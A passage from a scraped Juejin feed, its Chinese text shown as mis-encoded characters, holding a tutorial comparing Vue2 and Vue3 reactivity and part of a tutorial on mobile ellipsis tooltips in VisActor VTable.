#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å“åº”å¼ä¾¦æµ‹</h2>
<h3 data-id="heading-1">1. å¯¹è±¡ä¾¦æµ‹</h3>
<h4 data-id="heading-2">Vue2 å®ç°æ–¹å¼</h4>
<p>Vue2 ä½¿ç”¨Â <code>Object.defineProperty</code>Â æ¥æ£€æµ‹å¯¹è±¡çš„å˜åŒ–ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> car = {}
<span class="hljs-keyword">let</span> val = <span class="hljs-number">3000</span>

<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(car, <span class="hljs-string">'price'</span>, {
  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'priceå±æ€§è¢«è¯»å–äº†'</span>)
    <span class="hljs-keyword">return</span> val
  },
  <span class="hljs-title function_">set</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'priceå±æ€§è¢«ä¿®æ”¹äº†'</span>)
    val = newVal
  }
})
</code></pre>
<p>Vue2 é€šè¿‡é€’å½’çš„Â <code>Observer</code>Â å°†å¯¹è±¡ä¸­çš„æ‰€æœ‰å±æ€§è½¬æ¢ä¸ºå¯è§‚æµ‹å¯¹è±¡<br/>
åœ¨ getter ä¸­æ”¶é›†ä¾èµ–ï¼Œåœ¨ setter ä¸­é€šçŸ¥ä¾èµ–æ›´æ–°</p>
<p><strong>ä¾èµ–</strong>ï¼šæ•°æ®å˜åŒ–çš„æ—¶å€™ä¼šå»é€šçŸ¥è§†å›¾ï¼Œä½†æ˜¯ä¸èƒ½å…¨å±€å»é€šçŸ¥ï¼Œæ‰€ä»¥è¦æ”¶é›†è°ä½¿ç”¨äº†è¿™ä¸ªæ•°æ®ï¼Œè¿™ä¸ªè°ï¼Œå°±æ˜¯ä¾èµ–</p>
<p>åœ¨vueä¸­ï¼Œè°å¾—åˆ°æ•°æ®è°å°±æ˜¯ä¾èµ–ï¼Œä¼šç»™è°åˆ›å»ºä¸€ä¸ªWaterå®ä¾‹ï¼Œç”¨è¿™ä¸ªå®ä¾‹æ¥ä»£è¡¨ä¾èµ–ï¼Œç”±Waterå»é€šçŸ¥çœŸæ­£çš„ä¾èµ–ï¼Œä¸Šæ–¹é‚£ä¸ªupdateå°±æ˜¯Waterçš„ä¸œè¥¿</p>
<p>vueåœ¨getteré‡Œé¢æ”¶é›†ä¾èµ–ï¼Œåœ¨setteré‡Œé¢é€šçŸ¥ä¾èµ–å»è¿›è¡Œæ›´æ–°<br/>
vueä¸ºæ¯ä¸ªæ•°æ®éƒ½å»ºç«‹äº†ä¸€ä¸ªä¾èµ–ç®¡ç†å™¨ï¼ŒæŠŠè¿™ä¸ªæ•°æ®çš„æ‰€æœ‰ä¾èµ–éƒ½ç®¡ç†èµ·æ¥</p>
<p><strong>ä¾èµ–ç®¡ç†å™¨å®ç°ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¾èµ–ç®¡ç†å™¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dep</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span> = []
  }
  
  <span class="hljs-title function_">addSub</span>(<span class="hljs-params">sub</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">push</span>(sub)
  }
  
  <span class="hljs-title function_">removeSub</span>(<span class="hljs-params">sub</span>) {
    <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">indexOf</span>(sub)
    <span class="hljs-keyword">if</span> (index &gt; -<span class="hljs-number">1</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>)
    }
  }
  
  <span class="hljs-title function_">depend</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">target</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addSub</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">target</span>)
    }
  }
  
  <span class="hljs-title function_">notify</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> subs = <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">slice</span>()
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>, l = subs.<span class="hljs-property">length</span>; i &lt; l; i++) {
      subs[i].<span class="hljs-title function_">update</span>() <span class="hljs-comment">// é€šçŸ¥ä¾èµ–æ›´æ–°</span>
    }
  }
}
</code></pre>
<p><strong>æµç¨‹ï¼š</strong></p>
<p>æ•°æ®é€šè¿‡ç›‘å¬å™¨è½¬æ¢æˆæ‹¥æœ‰ getter å’Œ setter çš„å½¢å¼<br/>
å¤–ç•Œé€šè¿‡ Watcher è¯»å–æ•°æ®ï¼Œè§¦å‘ getter å°† Watcher æ·»åŠ åˆ°ä¾èµ–æ•°ç»„<br/>
æ•°æ®å˜åŒ–æ—¶ï¼Œsetter è°ƒç”¨ Watcherï¼ˆä¾èµ–ï¼‰å‘é€é€šçŸ¥<br/>
Watcher æœ€ç»ˆé€šçŸ¥å¤–ç•Œï¼Œå¼•å‘è§†å›¾æ›´æ–°æˆ–å…¶ä»–æ“ä½œ</p>
<h4 data-id="heading-3">Vue3 å®ç°æ–¹å¼</h4>
<p>Vue3 ä½¿ç”¨Â <code>Proxy</code>Â æ¥æ£€æµ‹å˜åŒ–ã€‚</p>
<ul>
<li>å¯ä»¥ç›´æ¥ç›‘å¬æ•´ä¸ªå¯¹è±¡ï¼Œæ— éœ€é€’å½’éå†</li>
<li>å¯ä»¥ç›‘å¬æ–°å¢å’Œåˆ é™¤çš„å±æ€§</li>
<li>æ€§èƒ½æ›´å¥½</li>
</ul>
<h3 data-id="heading-4">2. æ•°ç»„ä¾¦æµ‹</h3>
<h4 data-id="heading-5">Vue2 å®ç°æ–¹å¼</h4>
<p>æ•°ç»„æ— æ³•ç›´æ¥ä½¿ç”¨Â <code>Object.defineProperty</code>Â è¿›è¡Œä¾¦æµ‹ã€‚</p>
<ol>
<li>å°è£…æ•°ç»„çš„åŸç”Ÿæ–¹æ³•ï¼Œä½¿å…¶èƒ½å¤Ÿè¢«ä¾¦æµ‹</li>
<li>ä½¿ç”¨å˜å¼‚æ–¹æ³•ï¼ˆmutator methodsï¼‰æ¥è§¦å‘æ›´æ–°</li>
</ol>
<p><code>Array</code>åŸå‹ä¸­å¯ä»¥æ”¹å˜æ•°ç»„è‡ªèº«å†…å®¹çš„æ–¹æ³•æœ‰7ä¸ªï¼Œåˆ†åˆ«æ˜¯<code>push</code>,<code>pop</code>,<code>shift</code>,<code>unshift</code>,<code>splice</code>,<code>sort</code>,<code>reverse</code></p>
<p><strong>å®ç°åŸç†ï¼š</strong></p>
<ul>
<li>åˆ›å»ºç»§æ‰¿è‡ªÂ <code>Array.prototype</code>Â çš„æ–°å¯¹è±¡</li>
<li>é‡å†™ä¸Šè¿°7ä¸ªæ–¹æ³•ï¼Œåœ¨è°ƒç”¨åŸç”Ÿæ–¹æ³•åæ‰‹åŠ¨è§¦å‘æ›´æ–°é€šçŸ¥</li>
<li>æ•°ç»„ä¾ç„¶ä½¿ç”¨ getter æ”¶é›†ä¾èµ–ï¼Œä½†é€šè¿‡å°è£…çš„æ•°ç»„æ–¹æ³•æ„ŸçŸ¥å˜åŒ–</li>
</ul>
<p>ä¸è¶³çš„åœ°æ–¹åœ¨äºï¼Œé€šè¿‡ä¸‹æ ‡æ“ä½œçš„æ—¶å€™ï¼Œvueæ— æ³•ç›‘å¬åˆ°ï¼Œæ‰€ä»¥vueæä¾›äº†Vue.setå’ŒVue.deleteè¿™å‡ ä¸ªæ–¹æ³•</p>
<h4 data-id="heading-6">Vue3 å®ç°æ–¹å¼</h4>
<p>Vue3 ä½¿ç”¨Â <code>Proxy</code>Â å¯ä»¥ç›‘å¬åˆ°æ•°ç»„çš„æ‰€æœ‰å˜åŒ–ã€‚</p>
<ul>
<li>å¯ä»¥ç›´æ¥ç›‘å¬æ•°ç»„ä¸‹æ ‡æ“ä½œ</li>
<li>å¯ä»¥ç›‘å¬æ•°ç»„é•¿åº¦çš„å˜åŒ–</li>
<li>æ— éœ€ç‰¹æ®Šå¤„ç†æ•°ç»„æ–¹æ³•</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> array = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(array, {
  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value, receiver</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ•°ç»„çš„<span class="hljs-subst">${property}</span>å±æ€§è¢«ä¿®æ”¹ä¸º<span class="hljs-subst">${value}</span>`</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, property, value, receiver)
  }
})
</code></pre>
<h3 data-id="heading-7">æ€»ç»“å¯¹æ¯”</h3>








































<table><thead><tr><th>ç‰¹æ€§</th><th>Vue2 (Object.defineProperty)</th><th>Vue3 (Proxy)</th></tr></thead><tbody><tr><td>å¯¹è±¡ç›‘å¬</td><td>éœ€è¦é€’å½’éå†å¯¹è±¡å±æ€§</td><td>ç›´æ¥ç›‘å¬æ•´ä¸ªå¯¹è±¡</td></tr><tr><td>æ–°å¢å±æ€§</td><td>æ— æ³•è‡ªåŠ¨ä¾¦æµ‹ï¼Œéœ€è¦Vue.set</td><td>è‡ªåŠ¨ä¾¦æµ‹</td></tr><tr><td>åˆ é™¤å±æ€§</td><td>æ— æ³•è‡ªåŠ¨ä¾¦æµ‹ï¼Œéœ€è¦Vue.delete</td><td>è‡ªåŠ¨ä¾¦æµ‹</td></tr><tr><td>æ•°ç»„ç›‘å¬</td><td>é‡å†™7ä¸ªæ•°ç»„æ–¹æ³•</td><td>ç›´æ¥ç›‘å¬æ‰€æœ‰å˜åŒ–</td></tr><tr><td>æ•°ç»„ä¸‹æ ‡æ“ä½œ</td><td>æ— æ³•ä¾¦æµ‹</td><td>å¯ä»¥ä¾¦æµ‹</td></tr><tr><td>æ€§èƒ½</td><td>é€’å½’åˆå§‹åŒ–æˆæœ¬é«˜</td><td>æƒ°æ€§ç›‘å¬ï¼Œæ€§èƒ½æ›´å¥½</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[visactor vTable åœ¨ç§»åŠ¨ç«¯æ”¯æŒ ellipsis æ°”æ³¡]]></title>    <link>https://juejin.cn/post/7592438587389804582</link>    <guid>https://juejin.cn/post/7592438587389804582</guid>    <pubDate>2026-01-07T14:11:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592438587389804582" data-draft-id="7592455394062286886" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="visactor vTable åœ¨ç§»åŠ¨ç«¯æ”¯æŒ ellipsis æ°”æ³¡"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-07T14:11:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="pimkle"/> <meta itemprop="url" content="https://juejin.cn/user/4177799914731624"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            visactor vTable åœ¨ç§»åŠ¨ç«¯æ”¯æŒ ellipsis æ°”æ³¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4177799914731624/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    pimkle
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:11:21.000Z" title="Wed Jan 07 2026 14:11:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    12
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å‰è¨€ï¼š</p>
<p>ä¸ºäº†ä¼˜åŒ–ç”¨æˆ·ä½“éªŒ</p>
<p>VTable å†…éƒ¨åœ¨ç§»åŠ¨ç«¯æ•…æ„å±è”½äº†çœç•¥å·æ°”æ³¡çš„å±•ç¤º</p>
<p>æœ¬æ–‡æ—¨åœ¨æä¾›ç›¸å¯¹ä½“éªŒè¾ƒå¥½çš„ç§»åŠ¨ç«¯çš„ ellipsis æ°”æ³¡å±•ç¤ºå®Œæ•´ä¿¡æ¯çš„è§£å†³æ–¹æ¡ˆ</p>
</blockquote>
<h2 data-id="heading-0">1. é…ç½®å¥½ refï¼Œä»¥ä¾›å¼•ç”¨</h2>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">VTable</span>
      <span class="hljs-attr">:id</span>=<span class="hljs-string">"uid"</span>
      <span class="hljs-attr">ref</span>=<span class="hljs-string">"tableRef"</span>
      <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span>
    /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">const</span> tableRef = <span class="hljs-title function_">ref</span>();
</code></pre>
<h2 data-id="heading-1">2. åˆ¤æ–­å½“å‰ cell æ˜¯å¦æ˜¯æº¢å‡ºçš„</h2>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isCellTextOverflow</span>(<span class="hljs-params">tableInstance: <span class="hljs-built_in">any</span>, col: <span class="hljs-built_in">number</span>, row: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-comment">// getCellOverflowText è¿”å›éç©ºå­—ç¬¦ä¸²è¯´æ˜æœ‰æº¢å‡º</span>
  <span class="hljs-keyword">const</span> overflowText = tableInstance.<span class="hljs-title function_">getCellOverflowText</span>(col, row);
  <span class="hljs-keyword">return</span> !!overflowText;
}
</code></pre>
<h2 data-id="heading-2">3. å±•ç¤ºæ°”æ³¡</h2>
<p>æœ‰ 2 ç§æ–¹æ¡ˆï¼Œä¼˜ç¼ºç‚¹æ¯”è¾ƒå¦‚ä¸‹è¡¨ï¼š</p>




















<table><thead><tr><th>æ°”æ³¡æ–¹æ¡ˆ</th><th>VTable åŸç”Ÿæ°”æ³¡</th><th>è‡ªå®šä¹‰æ°”æ³¡</th></tr></thead><tbody><tr><td>ä¼˜ç‚¹</td><td>é…ç½®ç®€å• <br/> å‡ºç°çš„ä½ç½®ä¸éœ€è¦å¤§é‡è®¡ç®—</td><td>é•¿çš„å¥½çœ‹ <br/> ç”¨æˆ·æ“ä½œçµæ´» ç‚¹å‡»æ»šåŠ¨ç­‰å°±ä¼šåŠæ—¶æ¶ˆå¤±</td></tr><tr><td>ç¼ºç‚¹</td><td>æ ·å¼ä¸‘ <br/> ç”¨æˆ·æ“ä½œä¸çµæ´»ï¼Œä¸ä¼šåŠæ—¶æ¶ˆå¤±</td><td>é…ç½®ç¹ç</td></tr></tbody></table>
<h3 data-id="heading-3">3.1 VTable åŸç”Ÿæ°”æ³¡</h3>
<h4 data-id="heading-4">3.1.1 å¼€å¯ tooltip å¼€å…³</h4>
<p>å¦‚æœå¯ä»¥åœ¨åˆå§‹åŒ–é…ç½® <code>VTable</code> çš„ <code>config</code> çš„è¯
ç›´æ¥åœ¨åˆå§‹åŒ–çš„æ—¶å€™ï¼ŒæŠŠ <code>config.tootip.isShowOverflowTextTooltip</code> é…ç½®ä¸º <code>true</code> å³å¯ã€‚</p>
<p>å¦‚æœå¼€å‘æ²¡æœ‰é…ç½® <code>VTable</code> <code>config</code> çš„åˆå§‹åŒ–æƒé™çš„è¯ï¼Œä¹Ÿå¯ä»¥åœ¨ <code>VTable</code> åˆå§‹åŒ–å¥½åï¼Œé€šè¿‡ <code>updateOption</code> æ¥æ›´æ–°é…ç½®ï¼Œæ³¨æ„ä¸è¦è¦†ç›–æ‰åŸç”Ÿçš„å…¶ä»–é…ç½®é¡¹ã€‚</p>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">const</span> tableInstance = tableRef.<span class="hljs-property">value</span>?.<span class="hljs-property">table</span>;
tableInstance.<span class="hljs-title function_">updateOption</span>({
    ...tableInstance.<span class="hljs-property">options</span>,
    <span class="hljs-attr">tooltip</span>: {
      ...tableInstance.<span class="hljs-property">options</span>.<span class="hljs-property">tooltip</span>,
      <span class="hljs-attr">isShowOverflowTextTooltip</span>: <span class="hljs-literal">true</span>,
    }
});
</code></pre>
<h4 data-id="heading-5">3.1.2 ç›‘å¬ç”¨æˆ·çš„ç‚¹å‡»äº‹ä»¶å±•ç¤º tooltip</h4>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">import</span> { <span class="hljs-variable constant_">TABLE_EVENT_TYPE</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vtable'</span>;

tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">CLICK_CELL</span>, <span class="hljs-function">(<span class="hljs-params">args: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> isOverflow = <span class="hljs-title function_">isCellTextOverflow</span>(tableInstance, col, row);
    <span class="hljs-keyword">if</span> (!isOverflow) {
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// è°ƒç”¨å†…éƒ¨ TooltipHandler æ‰‹åŠ¨æ˜¾ç¤ºæ°”æ³¡</span>
      <span class="hljs-comment">// æ³¨æ„ï¼šinternalProps æ˜¯å†…éƒ¨å±æ€§ï¼Œä½¿ç”¨æ—¶éœ€è¦æ³¨æ„ TypeScript ç±»å‹å…¼å®¹ï¼ˆå¦‚éœ€ï¼‰</span>
      tableInstance.<span class="hljs-property">internalProps</span>.<span class="hljs-property">tooltipHandler</span>.<span class="hljs-title function_">showTooltip</span>(col, row);
    }, <span class="hljs-number">10</span>);
});
</code></pre>
<p>ç‚¹å‡»æœ‰æº¢å‡ºçš„ cellï¼Œå°±ä¼šåœ¨ cell é™„è¿‘å±•ç¤ºå‡ºæ¥çš„ VTable åŸç”Ÿçš„æ°”æ³¡äº†ï¼Œé•¿å¾—è¿˜æ˜¯æœ‰ç‚¹ä¸‘çš„ï¼Œå¦‚æœè¦ç”¨çš„è¯ï¼Œå»ºè®®åœ¨ <code>VTable</code> çš„ <code>option</code> é‡ŒåŠ ç‚¹æ ·å¼çš„é…ç½®ã€‚</p>
<p>å¦å¤–è¿™ä¸ªæ°”æ³¡çš„æ¶ˆå¤±é€»è¾‘æ˜¯ <code>VTable</code> åŸç”Ÿè‡ªå·±æ§åˆ¶çš„ï¼Œçµæ•åº¦ä¹Ÿè¾ƒä¸€èˆ¬ï¼Œä¸ä¼šåŠæ—¶æ¶ˆå¤±ï¼Œæœ‰ç²¾åŠ›ä¹Ÿå¯ç”»æ—¶é—´ç›‘å¬ä¼˜åŒ–ï¼Œè°ƒç”¨ <code>VTable</code> åŸç”Ÿå‡½æ•°çš„éšè—æ–¹æ³•ã€‚</p>
<h3 data-id="heading-6">3.2 è‡ªå®šä¹‰ DIV å±•ç¤º tooltip</h3>
<h4 data-id="heading-7">3.2.1 å†™ä¸ªè‡ªå®šä¹‰çš„ div</h4>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"tooltipTxt"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ left, top }"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-popup"</span>&gt;</span>
  {{ tooltipTxt }}
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">const</span> tooltipTxt = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);
<span class="hljs-keyword">const</span> left = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'0px'</span>);
<span class="hljs-keyword">const</span> top = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'0px'</span>);
</code></pre>
<p>é…ä¸ªå¥½çœ‹ç‚¹çš„æ°”æ³¡æ ·å¼</p>
<pre><code class="hljs language-SCSS" lang="SCSS"><span class="hljs-selector-class">.custom-popup</span> {
  <span class="hljs-attribute">position</span>: fixed;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">10</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.65</span>);
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">8px</span>;
  &amp;<span class="hljs-selector-pseudo">::after</span> {
